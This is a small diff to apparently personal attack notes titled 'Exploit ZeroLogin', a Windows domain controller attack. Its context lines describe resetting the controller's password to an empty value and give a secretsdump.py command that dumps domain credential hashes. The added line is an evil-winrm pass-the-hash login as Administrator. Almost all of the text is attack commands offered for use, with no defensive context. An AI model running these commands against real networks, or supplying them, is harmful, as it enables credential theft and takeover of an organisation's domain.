@@ -38,6 +38,7 @@ Exploit ZeroLogin
 Now passsord is reset to No value // we can dump the hashes
       ./secretsdump.py -just-dc -no-pass [DC-NetBIOS_name]\$@[DC-IP]
 Now hashes are pulled you can attempt to crack or PassThe-Has w/ Evil-winRM
+      evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>
 
 ..more to come
       
